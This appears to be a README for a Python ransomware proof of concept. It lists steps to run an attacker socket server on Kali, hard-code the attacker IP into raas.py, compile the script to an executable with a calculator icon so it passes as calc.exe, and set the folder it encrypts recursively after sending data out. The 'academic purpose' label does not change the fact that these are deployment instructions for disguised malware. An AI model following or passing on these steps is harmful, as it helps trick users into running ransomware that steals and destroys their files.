# NextGen-Ransomeware-Poc-Python [RaaS]
A simple python script pretending calc.exe to trigger user execute a ransomeware and sent data before encrypt.
Deployed on Windows environment.

## **Academic Purpose Only**

# Flow #
- Execute socket_server.py on your Kali
- Modify raas.py lines 34 client_socket.connect(("Kali IP", 5000))
- Run autopytoexe convertor the program as a exe
- Replace Icon to calculator.ico
- Output as a exectuable file

# Change infecting area #
- Lines 29 on raas.py Filenames = glob.glob("./Path You Want to encrypt/*")
- **Be careful encryption will recursively in all subfolder**
